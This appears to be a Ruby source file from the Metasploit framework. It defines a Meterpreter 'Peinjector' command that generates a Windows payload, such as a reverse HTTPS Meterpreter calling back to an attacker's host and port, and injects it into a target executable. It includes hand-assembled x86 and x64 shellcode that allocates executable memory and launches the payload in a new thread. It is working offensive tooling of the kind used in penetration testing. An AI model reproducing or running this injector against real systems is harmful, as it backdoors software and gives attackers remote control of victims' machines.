# -*- coding: binary -*-
require 'rex/post/meterpreter'
require 'pry'

module Rex
module Post
module Meterpreter
module Ui

###
#
# Peinjector extension - inject a given shellcode into an executable file
#
###
class Console::CommandDispatcher::Peinjector

  Klass = Console::CommandDispatcher::Peinjector

  include Console::CommandDispatcher

  #
  # Name for this dispatcher
  #
  def name
    'Peinjector'
  end

  #
  # List of supported commands.
  #
  def commands
    {
      'injectpe'  => 'Inject a shellcode into a given executable'
    }
  end


  @@injectpe_opts = Rex::Parser::Arguments.new(
    '-p' => [true, 'Windows Payload to inject into the targer executable.'],
    '-t' => [true, 'Path of the target executable to be injected'],
    '-o' => [true, 'Comma separated list of additional options for payload if needed in \'opt1=val,opt2=val\' format.'],
    '-h' => [false, 'Help banner']
  )

  def injectpe_usage
    print_line('Usage: injectpe -p < windows/meterpreter/reverse_https > -t < c:\target_file.exe >, -o < lhost=192.168.1.123, lport=4443 >')
    print_line
    print_line('Inject a shellcode on the target executable.')
    print_line(@@injectpe_opts.usage)
  end

  #
  # Inject a given shellcode into a remote executable
  #
  def cmd_injectpe(*args)
    if args.length == 0 || args.include?('-h')
	    injectpe_usage
      return false
    end

    opts = {
      payload: nil,
      targetpe: nil,
      options: nil
    	}

    @@injectpe_opts.parse(args) { |opt, idx, val|
      case opt
      when '-p'
        opts[:payload] = val
      when '-t'
        opts[:targetpe] = val
      when '-o'
        opts[:options] = val
      end
    }
    payload = create_payload(opts[:payload], opts[:options])

    inject_payload(payload, opts[:targetpe])
  end

  # Create a payload given a name, lhost and lport, additional options
  def create_payload(name, opts = "")

    pay = client.framework.payloads.create(name)
    pay.datastore['EXITFUNC'] = 'thread'
    pay.available_space = 1.gigabyte # this is to generate a proper uuid and make the payload to work with the universal handler

    if not opts.blank?
      opts.split(",").each do |o|
      opt,val = o.split("=",2)
      pay.datastore[opt] = val
      end
    end

    # Validate the options for the module
    pay.options.validate(pay.datastore)
    return pay
  end

  def inject_payload(pay, targetpe)

    begin
      print_status("Generating payload")
      raw = pay.generate
      param = {}

      if pay.arch.join == ARCH_X64
        threaded_shellcode = add_thread_x64(raw)
        param[:isx64] = true
      else
        threaded_shellcode = add_thread_x86(raw)
        param[:isx64] = false
      end

      param[:shellcode] = threaded_shellcode
      param[:targetpe] = targetpe
      param[:size] = threaded_shellcode.length;

      print_status("Injecting #{pay.name} into the executable #{targetpe}")
      client.peinjector.inject_shellcode(param)
      print_good("Successfully injected payload into the executable: #{targetpe}")

    rescue ::Exception => e
      print_error("Failed to Inject Payload to executable #{targetpe}!")
      print_error(e.to_s)
    end
  end


  def add_thread_x86(payload)

    stackpreserve = "\x90\x90\x60\x9c"
    shellcode = "\xE8\xB7\xFF\xFF\xFF"
    shellcode += payload

    thread = "\xFC\x90\xE8\xC1\x00\x00\x00\x60\x89\xE5\x31\xD2\x90\x64\x8B" +
        "\x52\x30\x8B\x52\x0C\x8B\x52\x14\xEB\x02" +
        "\x41\x10\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0\xAC\x3C\x61" +
        "\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\x49\x75\xEF\x52\x90\x57\x8B" +
        "\x52\x10\x90\x8B\x42\x3C\x01\xD0\x90\x8B\x40\x78\xEB\x07\xEA\x48" +
        "\x42\x04\x85\x7C\x3A\x85\xC0\x0F\x84\x68\x00\x00\x00\x90\x01\xD0" +
        "\x50\x90\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x58\x49\x8B\x34\x8B" +
        "\x01\xD6\x31\xFF\x90\x31\xC0\xEB\x04\xFF\x69\xD5\x38\xAC\xC1\xCF" +
        "\x0D\x01\xC7\x38\xE0\xEB\x05\x7F\x1B\xD2\xEB\xCA\x75\xE6\x03\x7D" +
        "\xF8\x3B\x7D\x24\x75\xD4\x58\x90\x8B\x58\x24\x01\xD3\x90\x66\x8B" +
        "\x0C\x4B\x8B\x58\x1C\x01\xD3\x90\xEB\x04\xCD\x97\xF1\xB1\x8B\x04" +
        "\x8B\x01\xD0\x90\x89\x44\x24\x24\x5B\x5B\x61\x90\x59\x5A\x51\xEB" +
        "\x01\x0F\xFF\xE0\x58\x90\x5F\x5A\x8B\x12\xE9\x53\xFF\xFF\xFF\x90" +
        "\x5D\x90" +
        "\xBE"

    thread +=[shellcode.length - 5].pack("V")

    thread += "\x90\x6A\x40\x90\x68\x00\x10\x00\x00" +
        "\x56\x90\x6A\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x89\xC3\x89\xC7\x90" +
        "\x89\xF1"

    thread += "\xeb\x44"  # <--length of shellcode below

    thread += "\x90\x5e"

    thread += "\x90\x90\x90" +
        "\xF2\xA4" +
        "\xE8\x20\x00\x00" +
        "\x00\xBB\xE0\x1D\x2A\x0A\x90\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06" +
        "\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF" +
        "\xD5\x31\xC0\x50\x50\x50\x53\x50\x50\x68\x38\x68\x0D\x16\xFF\xD5" +
        "\x58\x58\x90\x61"

    thread += "\xe9"

    thread += [shellcode.length].pack("V")
    return stackpreserve + thread + shellcode
  end

  def add_thread_x64(payload)

    stackpreserve = "\x90\x90\x50\x53\x51\x52\x56\x57\x54\x55\x41\x50" +
        "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"


    stackrestore = "\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59" +
        "\x41\x58\x5d\x5c\x5f\x5e\x5a\x59\x5b\x58"


    stackpreserve = "\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50" +
        "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"


    shellcode = "\xE8\xB8\xFF\xFF\xFF"

    shellcode += payload

    thread = "\x90" +                              # <--THAT'S A NOP. \o/
        "\xe8\xc0\x00\x00\x00" +              # jmp to allocate
        # api_call
        "\x41\x51" +                          # push r9
        "\x41\x50" +                          # push r8
        "\x52" +                              # push rdx
        "\x51" +                              # push rcx
        "\x56" +                              # push rsi
        "\x48\x31\xD2" +                      # xor rdx,rdx
        "\x65\x48\x8B\x52\x60" +              # mov rdx,qword ptr gs:[rdx+96]
        "\x48\x8B\x52\x18" +                  # mov rdx,qword ptr [rdx+24]
        "\x48\x8B\x52\x20" +                  # mov rdx,qword ptr[rdx+32]

        # next_mod
        "\x48\x8b\x72\x50" +                  # mov rsi,[rdx+80]
        "\x48\x0f\xb7\x4a\x4a" +              # movzx rcx,word [rdx+74]
        "\x4d\x31\xc9" +                      # xor r9,r9

        # loop_modname
        "\x48\x31\xc0" +                      # xor rax,rax
        "\xac" +                              # lods
        "\x3c\x61" +                          # cmp al, 61h (a)
        "\x7c\x02" +                          # jl 02
        "\x2c\x20" +                          # sub al, 0x20

        # not_lowercase
        "\x41\xc1\xc9\x0d" +                  # ror r9d, 13
        "\x41\x01\xc1" +                      # add r9d, eax
        "\xe2\xed" +                          # loop until read, back to xor rax, rax
        "\x52" +                              # push rdx ;Save the current position in the module list
        "\x41\x51" +                          # push r9 ; Save the current module hash for later
        # ; Proceed to itterate the export address table,
        "\x48\x8b\x52\x20" +                  # mov rdx, [rdx+32] ; Get this modules base address
        "\x8b\x42\x3c" +                      # mov eax, dword [rdx+60] ; Get PE header
        "\x48\x01\xd0" +                      # add rax, rdx ; Add the modules base address
        "\x8b\x80\x88\x00\x00\x00" +          # mov eax, dword [rax+136] ; Get export tables RVA
        "\x48\x85\xc0" +                      # test rax, rax ; Test if no export address table
        "\x74\x67" +                          # je get_next_mod1 ; If no EAT present, process the nex
        "\x48\x01\xd0" +                      # add rax, rdx ; Add the modules base address
        "\x50" +                              # push rax ; Save the current modules EAT
        "\x8b\x48\x18" +                      # mov ecx, dword [rax+24] ; Get the number of function
        "\x44\x8b\x40\x20" +                  # mov r8d, dword [rax+32] ; Get the rva of the function
        "\x49\x01\xd0" +                      # add r8, rdx ; Add the modules base address

        # get_next_func: ;
        "\xe3\x56" +                          # jrcxz get_next_mod; When we reach the start of the EAT
        "\x48\xff\xc9" +                      # dec rcx ; Decrement the function name counter
        "\x41\x8b\x34\x88" +                  # mov esi, dword [r8+rcx*4]; Get rva of next module name
        "\x48\x01\xd6" +                      # add rsi, rdx ; Add the modules base address
        "\x4d\x31\xc9" +                      # xor r9, r9 ; Clear r9 which will store the hash
        #  ; And compare it to the one we wan
        # loop_funcname: ;
        "\x48\x31\xc0" +                     # xor rax, rax ; Clear rax
        "\xac" +                             # lodsb ; Read in the next byte of the ASCII funct name
        "\x41\xc1\xc9\x0d" +                 # ror r9d, 13 ; Rotate right our hash value
        "\x41\x01\xc1" +                     # add r9d, eax ; Add the next byte of the name
        "\x38\xe0" +                         # cmp al, ah ; Compare AL to AH (null)
        "\x75\xf1" +                         # jne loop_funcname ; continue
        "\x4c\x03\x4c\x24\x08" +             # add r9, [rsp+8] ; Add the current module hash
        "\x45\x39\xd1" +                     # cmp r9d, r10d ; Compare the hash
        "\x75\xd8" +                         # jnz get_next_func ; Go compute the next function hash

        "\x58" +                             # pop rax ; Restore the current modules EAT
        "\x44\x8b\x40\x24" +                 # mov r8d, dword [rax+36] ; Get the ordinal table rva
        "\x49\x01\xd0" +                     # add r8, rdx ; Add the modules base address
        "\x66\x41\x8b\x0c\x48" +             # mov cx, [r8+2*rcx] ; Get the desired functions ordinal
        "\x44\x8b\x40\x1c" +                 # mov r8d, dword [rax+28] ; Get the funct addr table rva
        "\x49\x01\xd0" +                     # add r8, rdx ; Add the modules base address
        "\x41\x8b\x04\x88" +                 # mov eax, dword [r8+4*rcx]; Get the desired func RVA
        "\x48\x01\xd0" +                     # add rax, rdx ; Add the modules base address

        # finish:
        "\x41\x58" +                         # pop r8 ; Clear off the current modules hash
        "\x41\x58" +                         # pop r8 ;Clear off the curr position in the module list
        "\x5E" +                             # pop rsi ; Restore RSI
        "\x59" +                             # pop rcx ; Restore the 1st parameter
        "\x5A" +                             # pop rdx ; Restore the 2nd parameter
        "\x41\x58" +                         # pop r8 ; Restore the 3rd parameter
        "\x41\x59" +                         # pop r9 ; Restore the 4th parameter
        "\x41\x5A" +                         # pop r10 ; pop off the return address
        "\x48\x83\xEC\x20" +                 # sub rsp, 32 ; reserve space for the register params

        "\x41\x52" +                         # push r10 ; push back the return address
        "\xFF\xE0" +                         # jmp rax ; Jump into the required function

        # get_next_mod: ;
        "\x58" +                             # pop rax ; Pop off the current modules EAT

        # get_next_mod1: ;
        "\x41\x59" +                         # pop r9 ; Pop off the current modules hash
        "\x5A" +                             # pop rdx ; Restore our position in the module list
        "\x48\x8B\x12" +                     # mov rdx, [rdx] ; Get the next module
        "\xe9\x57\xff\xff\xff"               # jmp next_mod ; Process this module

    # allocate
    thread += "\x5d" +                             # pop rbp
        "\x49\xc7\xc6"                       # mov r14, 1abh size of payload...

    thread += [shellcode.length - 5].pack("V")
    thread += "\x6a\x40" +                         # push 40h
        "\x41\x59" +                         # pop r9 now 40h
        "\x68\x00\x10\x00\x00" +             # push 1000h
        "\x41\x58" +                         # pop r8.. now 1000h
        "\x4C\x89\xF2" +                     # mov rdx, r14
        "\x6A\x00" +                         # push 0
        "\x59" +                             # pop rcx
        "\x68\x58\xa4\x53\xe5" +             # push E553a458
        "\x41\x5A" +                         # pop r10
        "\xff\xd5" +                         # call rbp
        "\x48\x89\xc3" +                     # mov rbx, rax      ; Store allocated address in ebx
        "\x48\x89\xc7"                       # mov rdi, rax      ; Prepare EDI with the new address


    thread += "\x48\xc7\xc1"
    thread += [shellcode.length - 5].pack("V")

    thread += "\xeb\x43"

    # got_payload:
    thread += "\x5e" +                             # pop rsi            ; Prepare ESI with the source
        "\xf2\xa4" +                         # rep movsb          ; Copy the payload to RWX memo
        "\xe8\x00\x00\x00\x00" +             # call set_handler   ; Configure error handling

        # set_handler:
        "\x48\x31\xC0" +                     # xor rax,rax
        "\x50" +                             # push rax            ; LPDWORD lpThreadId (NULL)
        "\x50" +                             # push rax            ; DWORD dwCreationFlags (0)
        "\x49\x89\xC1" +                     # mov r9, rax         ; LPVOID lpParameter (NULL)
        "\x48\x89\xC2" +                     # mov rdx, rax        ; LPTHREAD_START_ROUTINE  (payload)
        "\x49\x89\xD8" +                     # mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
        "\x48\x89\xC1" +                     # mov rcx, rax        ; LPSECURITY_ATTRIBUTES (NULL)
        "\x49\xC7\xC2\x38\x68\x0D\x16" +     # mov r10, 0x160D6838 ; hash("kernel32.dll","CreateThread")
        "\xFF\xD5" +                         # call rbp            ; Spawn payload thread
        "\x48\x83\xC4\x58" +                 # add rsp, 50

        # stackrestore
        "\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59" +
        "\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"

    thread += "\xe9"
    thread += [shellcode.length].pack("V")

    return stackpreserve + thread + shellcode
  end

end

end
end
end
end

